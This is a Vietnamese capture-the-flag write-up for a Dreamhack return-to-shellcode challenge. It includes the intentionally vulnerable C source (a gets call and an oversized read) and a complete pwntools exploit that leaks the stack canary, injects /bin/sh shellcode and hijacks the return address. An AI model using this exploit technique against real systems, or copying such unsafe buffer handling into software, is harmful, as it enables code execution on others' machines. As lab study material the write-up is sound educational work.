* Đoạn code C của file r2s như này :
```sh
  // Name: r2s.c
  // Compile: gcc -o r2s r2s.c -zexecstack

 #include <stdio.h>
 #include <unistd.h>
 
 void init() {
  setvbuf(stdin, 0, 2, 0);
  setvbuf(stdout, 0, 2, 0);
 }

 int main() {
  char buf[0x50];

  init();

  printf("Address of the buf: %p\n", buf);
  printf("Distance between buf and $rbp: %ld\n", 
         (char*)__builtin_frame_address(0) - buf);

  printf("[1] Leak the canary\n");
  printf("Input: ");
  fflush(stdout);

  read(0, buf, 0x100);
  printf("Your input is '%s'\n", buf);

  puts("[2] Overwrite the return address");
  printf("Input: ");
  fflush(stdout);
  gets(buf);

  return 0;
  }
```
**Analysis**
* Đầu tiên ta dùng `pwn checksec .r2s` để kiểm tra cơ chế bảo vệ 
 - <img width="428" height="91" alt="image" src="https://github.com/user-attachments/assets/6dcb7b53-82a4-4bcd-988e-a8d212dfc9ad" />
 - Ta thấy tệp r2s này dã được áp dụng biện pháp Canary trên ngăn xếp
* Nhìn vào trong đoạn code C ta thấy :
  - Địa chỉ của bộ đệm đã được chương trình in ra : địa chỉ `buf` và khoảng cách giữa buf và RBP
    ```sh
    printf("Address of the buf: %p\n", buf);
    printf("Distance between buf and $rbp: %ld\n",
        (char*)__builtin_frame_address(0) - buf);
    ```
  - Tràn bộ đệm ngăn xếp :
    ```sh
     char buf[0x50];

     read(0, buf, 0x100);   // 0x50 < 0x100
     gets(buf);             // hàm ko an toàn
    ```
  * Ta có thể nghĩ tới 1 kịch bản khai thác như sau :
    - Vì có mã canary mà ta có thể tận dụng được hàm `read` đầu vào thứ nhất để làm tràn buf với lượng giá trị thích hợp để in ra lấy được canary
      ```sh
      read(0, buf, 0x100);                  // Fill buf until it meets canary 
      printf("Your input is '%s'\n", buf);
      ```
    - Ta thấy file này có thêm 1 đầu vào thứ 2 là hàm gets nữa nên ở lần nhập thứ 2 ta chèn shellcode vào đó + mã canary và ghi đè địa chỉ của buf lên return address
    - Stack trông như sau :
    - <img width="331" height="343" alt="image" src="https://github.com/user-attachments/assets/ee7ff9ca-75a4-4631-8fba-1f28cf151a05" />

  **Exploit**
  * Ta viết đc script như sau :
```sh
    from pwn import * 

   context.arch = 'amd64'

   p = remote('host3.dreamhack.games', 14160)  ;Kết nối với server

   p.recvuntil(b'buf: ')                       ; loại bỏ các hàm, kí tự rác chỉ dừng lại khi gặp kí tự `buf:`
   buf_addr = int(p.recvline()[:-1], 16)       ;Đọc toàn bộ phần còn lại của dòng đó,từ `buf:` trở đi cho đến khi gặp `\n` thì dừng lại, [-1] là xóa cái `\n` đi, `16` đó là thông báo đây là chuỗi hệ thập lục phân, hãy dịch nó thành chuỗi toán học để pwntools sử dụng
   success(f"Dia chi buf (ASLR): {hex(buf_addr)}") ; `success()` làm hàm trang trí của thư viện pwntools-hiện `[+]`,lấy con số toán học trong hàm `buf_addr` chuyển đổi thành định dạng chữ cho dễ đọc


   buf2cnry = 0x58                             ; Khoảng cách từ `buf` đến canary

   payload_leak = b'A'*(buf2cnry + 1)          ; payload_leak này tạo 1 chuỗi `A` có 88 byte của `buf2cnry` + thêm ` byte nữa để ghi đè vào byte đầu(x00) của canary
   p.sendafter(b'Input: ',payload_leak)        ; chờ chương trình in ra chữ `Input` thì bơm payload_leak trên vào vùng đệm

# khi hàm `printf` của chương trình được thực thi thì nó sẽ in ra chuỗi `A` ta vừa tạo và do đã bị ghi đè 1 byte vào byte NUll nên nó sẽ in luôn ra Canary thật dính liền sau chuỗi `A`
   p.recvuntil(payload_leak)                   ; Lệnh này vứt bỏ đi toàn bộ chứ A mà ta vừa nhập vào. khi ấy con trỏ đọc dữ liệu dừng lại đúng vị trí của byte đầu tiên của canary
   canary_leak = p.recvn(7)                    ; lệnh này yêu cầu python lấy đúng 7 byte tiếp theo, chính là 7 byte của canary

   canary_real = u64(b'\x00' + canary_leak) ; vì nãy ta thay `\x00` của canary thành 1 byte chữ `A` để leck canary ra thì giờ ta phải ghép trả lại cho nó cho đủ 8 byte quay về như ban đầu sau đó `u64()` dịch nốt 8 byte đó thành số nguyên toán học
   success(f'Canary : {hex(canary_real)}')  ;in con số canary ra màn hình dưới dạng hex cho dễ quan sát và kiểm tra 

   sh = asm( '''
     xor rsi, rsi
     xor rdx, rdx

     mov rbx, 0x68732f2f6e69622f (/bin//sh)
     push rbx

     mov rdi, rsp

     push 0x3b
     pop rax
     syscall
     '''
    )

   payload_r2s = sh                           ; Điền shellcode vào payload
   payload_r2s += b'A' * (buf2cnry - len(sh)) ; điền chuỗi chữ cái A với độ dài = khoảng cách từ `buf` tới canary - đi độ dài của shellcode
   payload_r2s += p64(canary_real)            ; chuyển canary từ số nguyên thành các byte mã máy thô chuẩn little-endian cho máy đọc và thực hiện
   payload_r2s += b'B'*8                      ; Điền 8 byte của RBP
   payload_r2s += p64(buf_addr)               ; Ghi đề địa chỉ trả về bằng địa chỉ của hàm `buf`

   p.sendlineafter(b'Input: ', payload_r2s)   ; Khi xuất hiện `Input:` lần thứ 2 thì đẩy payload_r2s vào đó để chương trình thực thi 

   p.interactive()                            ; Thư viện sẽ mở luồng tương tác trực tiếp với chương trình mục tiêu qua terminal
```
- Thông qua ngăn xếp ta tính đc khoảng cách giữa `buf` và `RBP` là 0x60 byte , từ đó ta tính được khoảng cách từ `buf` đến mã canary là : `0x60 - 8 = 0x58` 
